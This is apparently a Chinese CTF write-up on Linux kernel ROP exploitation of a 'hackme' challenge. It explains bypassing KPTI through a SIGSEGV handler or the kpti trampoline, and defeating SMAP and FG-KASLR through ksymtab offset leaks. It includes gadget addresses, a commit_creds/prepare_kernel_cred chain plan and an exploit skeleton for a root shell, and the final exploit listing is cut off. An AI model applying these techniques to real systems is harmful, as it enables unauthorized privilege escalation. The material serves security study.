<p><img src="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/isolation/user-kernel/figure/476px-Kernel_page-table_isolation.svg.png" alt="File:Kernel page-table isolation.svg"></p>
<p>在用户态时,页表包含了全部用户空间与内核空间的很小一部分, 主要是系统调用入口</p>
<p>在内核态时,页表包含了全部用户空间与全部内核空间, 但是用户空间的内存映射部分全都被标记为<strong>不可执行</strong>(但是还是可读写的)</p>
<p>涉及到用户态与内核态的转换时, 首先要更换页表</p>
<p>如果在内核态中不更换页表, 直接<code>iret</code>返回到用户空间想起<code>shell</code>会被<code>kpti</code>发现</p>
<h4 id="signal-handler方法"><a href="#signal-handler方法" class="headerlink" title="signal handler方法"></a>signal handler方法</h4><p>虽然不更换页表直接返回到用户态, 会被<code>kpti</code>发现</p>
<p>但是此时内核并不会崩溃,而是报告一个用户态的<code>SIGSEGV</code>信号</p>
<blockquote>
<p>为什么是用户态的段错误信号呢?</p>
<p>因为此时已经<code>iret</code>返回到用户态了</p>
<p>但是页表使用的仍然是<code>kpti</code>内核态页表, 而从这个也表上只能看出当前用户空间代码段没有x权限</p>
<p>因此实际上类似于NX保护时尝试执行堆栈中的<code>shellcode</code>, 是一个道理</p>
<p>因此是用户态的段错误</p>
</blockquote>
<p>调试发现, 当段错误信号发生时, 已经完成了<code>cred</code>的更换, 并且已经<code>iret</code>返回到了用户态</p>
<p>在用户态刚要执行的第一条代码触发了中断, 内核给用户发送了<code>SIGSEGV</code></p>
<p>如果此前用户已经注册了信号处理函数, <code>shell</code>作为<code>SIGSEGV</code>的处理函数, 内核会通过正常的中断处理程序返回到用户态, 内核自己正常返回时会自动切换页表, 因此经过这条路返回到用户态就正常了, 并且控制流也给到了shell函数中</p>
<p>就可以起一个<code>root shell</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    signal(SIGSEGV, spawn_shell);</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak_canary();  <span class="comment">//泄露canary</span></span><br><span class="line">    overflow();     <span class="comment">//溢出,绕过canary,构造rop链</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="kpti-trampoline方法"><a href="#kpti-trampoline方法" class="headerlink" title="kpti trampoline方法"></a>kpti trampoline方法</h4><p>基于这样一点考虑:</p>
<p>内核正常的系统调用如果能走某条路成功着陆用户态,那么<strong>我们也可以借道</strong></p>
<p>这个道就叫<code>kpti trampoline</code>, 这道可以 <code>更换页表, swapgs, iretq</code></p>
<blockquote>
<p>trampoline是指内核态返回到用户态的缓冲, 因此叫做蹦床</p>
</blockquote>
<p>位于内核函数<code>	swapgs_restore_regs_and_return_to_usermode </code>中</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//@ Linux-5.14/arch/x86/entry/entry_64.S</span></span><br><span class="line">SYM_CODE_START_LOCAL(common_interrupt_return)</span><br><span class="line">SYM_INNER_LABEL(swapgs_restore_regs_and_return_to_usermode, SYM_L_GLOBAL)</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_ENTRY</span></span><br><span class="line">	<span class="comment">/* Assert that pt_regs indicates user mode. */</span></span><br><span class="line">	testb	$<span class="number">3</span>, CS(%rsp)</span><br><span class="line">	jnz	<span class="number">1f</span></span><br><span class="line">	ud2</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	POP_REGS pop_rdi=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.</span></span><br><span class="line"><span class="comment">	 * Save old stack pointer and switch to trampoline stack.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy the IRET frame to the trampoline stack. */</span></span><br><span class="line">	pushq	<span class="number">6</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* SS */</span></span><br><span class="line">	pushq	<span class="number">5</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* RSP */</span></span><br><span class="line">	pushq	<span class="number">4</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* EFLAGS */</span></span><br><span class="line">	pushq	<span class="number">3</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* CS */</span></span><br><span class="line">	pushq	<span class="number">2</span>*<span class="number">8</span>(%rdi)	<span class="comment">/* RIP */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Push user RDI on the trampoline stack. */</span></span><br><span class="line">	pushq	(%rdi)</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We are on the trampoline stack.  All regs except RDI are live.</span></span><br><span class="line"><span class="comment">	 * We can do future final exit work right here.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	STACKLEAK_ERASE_NOCLOBBER</span><br><span class="line"></span><br><span class="line">	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Restore RDI. */</span></span><br><span class="line">	popq	%rdi</span><br><span class="line">	SWAPGS</span><br><span class="line">	INTERRUPT_RETURN</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>标号1这部分是正文</p>
<p>在这部分中,首先<code>POP_REGS pop_rdi=0</code>这是个宏, 它会从栈上弹出一系列值交给寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//@Linux5.14/arch/x86/entry/calling.h</span><br><span class="line">.macro POP_REGS pop_rdi=1 skip_r11rcx=0</span><br><span class="line">	popq %r15</span><br><span class="line">	popq %r14</span><br><span class="line">	popq %r13</span><br><span class="line">	popq %r12</span><br><span class="line">	popq %rbp</span><br><span class="line">	popq %rbx</span><br><span class="line">	.if \skip_r11rcx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.else</span><br><span class="line">	popq %r11</span><br><span class="line">	.endif</span><br><span class="line">	popq %r10</span><br><span class="line">	popq %r9</span><br><span class="line">	popq %r8</span><br><span class="line">	popq %rax</span><br><span class="line">	.if \skip_r11rcx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.else</span><br><span class="line">	popq %rcx</span><br><span class="line">	.endif</span><br><span class="line">	popq %rdx</span><br><span class="line">	popq %rsi</span><br><span class="line">	.if \pop_rdi</span><br><span class="line">	popq %rdi</span><br><span class="line">	.endif</span><br><span class="line">.endm</span><br></pre></td></tr></table></figure>

<p>接下来rdi指向旧堆栈, 从gs段拿出rsp0交给rsp</p>
<p>然后把老堆栈上保存的用户上下文压到新堆栈里</p>
<p>然后更换页表</p>
<p>然后swapgs</p>
<p>然后iret</p>
<p>实际上此时iret使用的堆栈, 已经是新堆栈了,不是老堆栈</p>
</blockquote>
<p>具体干了啥可以看反汇编</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms  | grep swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#POP_REGS部分省略</span><br><span class="line"></span><br><span class="line">  0xffffffff81200f26 &lt;_stext+2101030&gt;: mov    rdi,rsp</span><br><span class="line">  0xffffffff81200f29 &lt;_stext+2101033&gt;: mov    rsp,QWORD PTR gs:0x6004</span><br><span class="line">  0xffffffff81200f32 &lt;_stext+2101042&gt;: push   QWORD PTR [rdi+0x30]		;用户ss</span><br><span class="line">  0xffffffff81200f35 &lt;_stext+2101045&gt;: push   QWORD PTR [rdi+0x28]		;用户rsp</span><br><span class="line">  0xffffffff81200f38 &lt;_stext+2101048&gt;: push   QWORD PTR [rdi+0x20]		;用户eflags</span><br><span class="line">  0xffffffff81200f3b &lt;_stext+2101051&gt;: push   QWORD PTR [rdi+0x18]		;用户cs</span><br><span class="line">  0xffffffff81200f3e &lt;_stext+2101054&gt;: push   QWORD PTR [rdi+0x10]		;用户rip</span><br><span class="line">  0xffffffff81200f41 &lt;_stext+2101057&gt;: push   QWORD PTR [rdi]			;老栈顶</span><br><span class="line">  0xffffffff81200f43 &lt;_stext+2101059&gt;: push   rax</span><br><span class="line">  0xffffffff81200f44 &lt;_stext+2101060&gt;: xchg   ax,ax</span><br><span class="line">  0xffffffff81200f46 &lt;_stext+2101062&gt;: mov    rdi,cr3</span><br><span class="line">  0xffffffff81200f49 &lt;_stext+2101065&gt;: jmp    0xffffffff81200f7f &lt;_stext+2101119&gt;</span><br><span class="line">  </span><br><span class="line">  0xffffffff81200f7f &lt;_stext+2101119&gt;: or     rdi,0x1000			#蜜汁操作</span><br><span class="line">  0xffffffff81200f86 &lt;_stext+2101126&gt;: mov    cr3,rdi</span><br><span class="line">  0xffffffff81200f89 &lt;_stext+2101129&gt;: pop    rax</span><br><span class="line">  0xffffffff81200f8a &lt;_stext+2101130&gt;: pop    rdi</span><br><span class="line">  0xffffffff81200f8b &lt;_stext+2101131&gt;: swapgs</span><br><span class="line">  0xffffffff81200f8e &lt;_stext+2101134&gt;: nop    DWORD PTR [rax]</span><br><span class="line">  0xffffffff81200f91 &lt;_stext+2101137&gt;: jmp    0xffffffff81200fc0 &lt;_stext+2101184&gt;</span><br><span class="line">  </span><br><span class="line">  0xffffffff81200fc0 &lt;_stext+2101184&gt;: test   BYTE PTR [rsp+0x20],0x4</span><br><span class="line">  0xffffffff81200fc5 &lt;_stext+2101189&gt;: jne    0xffffffff81200fc9 &lt;_stext+2101193&gt;	#这个调试观察不会跳</span><br><span class="line">  0xffffffff81200fc7 &lt;_stext+2101191&gt;: iretq</span><br></pre></td></tr></table></figure>

<p>这里有一个很迷的操作, 把<code>cr3</code>里面的页表地址拿出来, 或了一个<code>0x1000</code>再放回去, 就完成了内核态-用户态页表的更换, 这是因为这俩页表地址还真就是这样挨着存放的, 这哥俩被称为一个<code>CR3 Pair</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/a99b0d0eef40d94aa386ee0d903b5a64.png" alt="CR3 Pair"></p>
<blockquote>
<p>这种伙伴形式还见于完全二叉树:</p>
<p>如果根从1开始编号, 那么其他节点的编号异或1就是其兄弟节点</p>
</blockquote>
<p>如果构造ROP链, 返回到<code>    0xffffffff81200f26 &lt;_stext+2101030&gt;: mov    rdi,rsp</code>这一行</p>
<p>下面还要填充两个dummy来满足这两个pop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81200f89 &lt;_stext+2101129&gt;: pop    rax</span><br><span class="line">0xffffffff81200f8a &lt;_stext+2101130&gt;: pop    rdi</span><br></pre></td></tr></table></figure>



<h3 id="bypass-SMAP"><a href="#bypass-SMAP" class="headerlink" title="bypass SMAP"></a>bypass SMAP</h3><p>smap意味着内核态无法访问用户态任何数据</p>
<p>象内核栈迁移到用户态映射区就白搭了</p>
<p>但是纯用rop链还是可以的</p>
<h3 id="bypass-KASLR"><a href="#bypass-KASLR" class="headerlink" title="bypass KASLR"></a>bypass KASLR</h3><p><code>FG-KASLR</code>,不光整个内核镜像基地址随机, 部分函数之间的相对偏移量也会变, 真是死🐎了</p>
<p>如果使用<code>readelf -S ./vmlinux | grep &quot;.text&quot;</code>查看text节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">^C</span><br><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># readelf -S ./vmlinux | grep <span class="string">&quot;.text&quot;</span> | head -n 15</span></span><br><span class="line">  [ <span class="number">1</span>] .text             PROGBITS         ffffffff81000000  <span class="number">00200000</span></span><br><span class="line">  [ <span class="number">2</span>] .rela.text        RELA             <span class="number">0000000000000000</span>  <span class="number">024</span>d3b10</span><br><span class="line">  [ <span class="number">3</span>] .text.unlike[...] PROGBITS         ffffffff81400dd7  <span class="number">00600</span>dd7</span><br><span class="line">  [ <span class="number">4</span>] .text.__star[...] PROGBITS         ffffffff81400e90  <span class="number">00600e90</span></span><br><span class="line">  [ <span class="number">5</span>] .text.__do_s[...] PROGBITS         ffffffff81400ea0  <span class="number">00600</span>ea0</span><br><span class="line">  [ <span class="number">6</span>] .text.__xen_[...] PROGBITS         ffffffff81400eb0  <span class="number">00600</span>eb0</span><br><span class="line">  [ <span class="number">7</span>] .text.vvar_mremap PROGBITS         ffffffff81400ed0  <span class="number">00600</span>ed0</span><br><span class="line">  [ <span class="number">8</span>] .text.vdso_fault  PROGBITS         ffffffff81400f00  <span class="number">00600f</span>00</span><br><span class="line">  [ <span class="number">9</span>] .text.map_vdso    PROGBITS         ffffffff81400f90  <span class="number">00600f</span>90</span><br><span class="line">  [<span class="number">10</span>] .text.map_vd[...] PROGBITS         ffffffff814010c0  <span class="number">006010</span>c0</span><br><span class="line">  [<span class="number">11</span>] .text.vdso_mremap PROGBITS         ffffffff81401170  <span class="number">00601170</span></span><br><span class="line">  [<span class="number">12</span>] .text.<span class="type">find_t</span>[...] PROGBITS         ffffffff81401210  <span class="number">00601210</span></span><br><span class="line">  [<span class="number">13</span>] .text.vvar_fault  PROGBITS         ffffffff81401230  <span class="number">00601230</span></span><br><span class="line">  [<span class="number">14</span>] .text.arch_g[...] PROGBITS         ffffffff81401450  <span class="number">00601450</span></span><br><span class="line">  [<span class="number">15</span>] .text.vdso_j[...] PROGBITS         ffffffff81401470  <span class="number">00601470</span></span><br></pre></td></tr></table></figure>

<p>除去纯正的<code>.text</code>节之外, 还有很多<code>.text.*</code>的节, 这些节都很小,甚至二三十字节一个, 节里面也就一两个函数</p>
<p>其作用就是每个节都可以随机排列, 实现<code>FG-KASLR</code></p>
<p>但是🐎还没有死完</p>
<p><code>.text</code>节是一整个儿,只会整体参与ASLR,但是节内的函数不会参与<code>FG-KASLR</code>,而节内函数就有<code>swapgs_restore_regs_and_return_to_usermode</code>,</p>
<p><code>.text</code>节在未开启<code>KASLR</code>时的范围: <code>0xffffffff81000000 ~ 0xffffffff81400dd7</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text @ 0xffffffff81000000 </span><br><span class="line">swapgs_restore_regs_and_return_to_usermode @ 0xffffffff81200f10		offset_to_text = 0x200f10</span><br><span class="line">kpti_trampoline @ 0xffffffff81200f26								offset_to_text = 0x200f26</span><br></pre></td></tr></table></figure>

<p><code>ksymtab</code>不属于任何<code>text</code>节,只参与<code>KASLR</code>,因此<code>ksymtab</code>到<code>.text</code> 的偏移量也是固定的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab @ <span class="number">0xffffffff81f85198</span>		offset_to_text = <span class="number">0xf85198</span></span><br></pre></td></tr></table></figure>

<p><code>ksymtab</code>是一个映射表表中的每一项都长这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">	  <span class="type">int</span> value_offset;				<span class="comment">//符号地址 相对于 本字段 的偏移量</span></span><br><span class="line">	  <span class="type">int</span> name_offset;				<span class="comment">//符号名地址 相对于 本字段 的偏移量</span></span><br><span class="line">	  <span class="type">int</span> namespace_offset;			<span class="comment">//符号命名空间地址, 相对于 本字段 的偏移量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这三个字段的意义是什么呢? 以commit_creds函数为例,</p>
<p>首先在未开启KASLR的内核上,找到它在ksymtab中的地址,是<code>0xffffffff81f87d90</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep <span class="string">&quot;commit_creds&quot;</span></span></span><br><span class="line">ffffffff814c6410 T commit_creds</span><br><span class="line">ffffffff81f87d90 r __ksymtab_commit_creds</span><br><span class="line">ffffffff81fa0972 r __kstrtab_commit_creds</span><br><span class="line">ffffffff81fa4d42 r __kstrtabns_commit_creds</span><br></pre></td></tr></table></figure>

<p>然后在gdb中打印<code>ffffffff81f87d90</code>处三个双字</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/3wx 0xffffffff81f87d90</span><br><span class="line">0xffffffff81f87d90:     0xff53e680      0x00018bde      0x0001cfaa</span><br></pre></td></tr></table></figure>

<p>也就是说</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value_offset = 0xff53e680</span><br><span class="line">name_offset = 0x00018bde</span><br><span class="line">name_space_offset = 0x0001cfaa</span><br></pre></td></tr></table></figure>

<p>其中<code>value_offset</code>是符号实际地址与本字段<code>kernel_symbol.value_offset</code>的偏移量</p>
<p>符号描述符__ksymtab_commit_creds的地址在<code>0xffffffff81f87d90</code></p>
<p>符号与符号描述符的距离是<code>((1&lt;&lt;32) - 0xff53e680)</code>,由此计算得到符号地址在<code>0xffffffff814c6410</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0xffffffff81f87d90</span> - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - <span class="number">0xff53e680</span>)</span><br><span class="line">$<span class="number">17</span> = <span class="number">0xffffffff814c6410</span></span><br></pre></td></tr></table></figure>

<p>同理name_offset也是符号名字符串所在地址相对于本字段<code>kernel_symbol.name_offset</code>的偏移量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 0xffffffff81fa0972 - 0xffffffff81f87d94</span><br><span class="line">$22 = 0x18bde</span><br></pre></td></tr></table></figure>

<p>同理name_space_offset是符号命名空间字符串与本字段<code>kernel_symbol.namespace_offset</code>的偏移量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>s <span class="number">0xffffffff81fa4d42</span></span><br><span class="line"><span class="number">0xffffffff81fa4d42</span>:     <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d43</span>:     <span class="string">&quot;bpf_trace_run11&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d53</span>:     <span class="string">&quot;bpf_trace_run12&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d63</span>:     <span class="string">&quot;kprobe_event_cmd_init&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d79</span>:     <span class="string">&quot;__kprobe_event_gen_cmd_start&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d96</span>:     <span class="string">&quot;__kprobe_event_add_fields&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4db0</span>:     <span class="string">&quot;kprobe_event_delete&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4dc4</span>:     <span class="string">&quot;__tracepoint_suspend_resume&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4de0</span>:     <span class="string">&quot;__tracepoint_cpu_idle&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4df6</span>:     <span class="string">&quot;__tracepoint_cpu_frequency&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以看到,这个符号属于一个通用的命名空间</p>
</blockquote>
<p>回到本题中,思路如下:</p>
<p>1.<code>hackme_read</code>函数中泄露<code>canary</code>, 一个<code>text</code>段的地址, 计算得到<code>text</code>基地址, 以及<code>ksymtab</code>地址等</p>
<p>2.<code>ksymtab </code>中查到<code>commit_creds</code>和<code>prepare_kernel_cred</code>的地址</p>
<p>3.构造<code>rop</code>链条</p>
<h4 id="1-栈上泄露一个text-地址"><a href="#1-栈上泄露一个text-地址" class="headerlink" title="1.栈上泄露一个text 地址"></a>1.栈上泄露一个<code>text</code> 地址</h4><p>在<code>read</code>函数中之前我们只泄露了<code>canary</code>值, 现在还要再泄露一个<code>text</code>段的地址,以此计算<code>text</code>段基地址</p>
<p>在未开启<code>KASLR</code>的情况下观察从<code>kstack_buf</code>开始的堆栈上,是否存在一个<code>text</code>段的地址 ,结果发现还真有</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241125151929536.png" alt="image-20241125151929536"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0xffffc900001bff38</span> <span class="number">-0xffffc900001bfe08</span></span><br><span class="line">$<span class="number">4</span> = <span class="number">0x130</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x130</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">5</span> = <span class="number">0x26</span></span><br><span class="line">pwndbg&gt; p <span class="number">0x130</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">6</span> = <span class="number">38</span></span><br></pre></td></tr></table></figure>

<p>也就是说 ,<code>stack_buf + 0x130 </code>字节开始处的一个四字就是这个泄露</p>
<h4 id="2-从ksymtab中查函数地址"><a href="#2-从ksymtab中查函数地址" class="headerlink" title="2.从ksymtab中查函数地址"></a>2.从<code>ksymtab</code>中查函数地址</h4><p>内存任意读,这也可以通过<code>gadget</code>实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot; : mov rax.*qword ptr .* ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span></span><br><span class="line"><span class="number">0xffffffff81004aad</span> : mov rax, qword ptr [rax + <span class="number">0x10</span>] ; pop rbp ; ret</span><br><span class="line"><span class="number">0xffffffff81015a7f</span> : mov rax, qword ptr [rax] ; pop rbp ; ret</span><br></pre></td></tr></table></figure>

<p>使用<code>0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret</code>这个<code>gadget</code>,还需要一个能够控制<code>rax</code>值的<code>gadget</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# <span class="built_in">cat</span> gadgets.ropgadget | grep <span class="string">&quot;pop rax ; ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span><br><span class="line">0xffffffff81004d11 : pop rax ; ret</span><br></pre></td></tr></table></figure>

<p>还需要一个控制<code>rdi</code>寄存器作为函数参数的<code>gadget</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# <span class="built_in">cat</span> gadgets.ropgadget | grep <span class="string">&quot;pop rdi ; ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span><br><span class="line">0xffffffff81006370 : pop rdi ; ret</span><br></pre></td></tr></table></figure>



<h4 id="3-构造ROP链条"><a href="#3-构造ROP链条" class="headerlink" title="3.构造ROP链条"></a>3.构造ROP链条</h4><p>1.任意内存读泄露<code>prepare_kernel_creds</code>函数偏移量</p>
<p>2.<code>kpti-trampoline</code>返回到用户态,计算<code>prepare_kernel_creds</code>函数地址</p>
<p>3.任意内存读泄露<code>commit_creds</code>函数偏移量</p>
<p>4.<code>kpti-trampoline</code>返回到用户态,计算<code>commit_creds</code>函数地址</p>
<p>5.<code>ret2 prepare_kernel_creds</code></p>
<p>6.<code>kpti-trampoline</code>返回到用户态,保存<code>init_task @ rax </code></p>
<p>7.<code>init_task pop to rdi</code></p>
<p>8.<code>ret2 commit_creds</code></p>
<p>9.<code>kpti-trampoline</code>返回到用户态,起<code>shell</code></p>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span 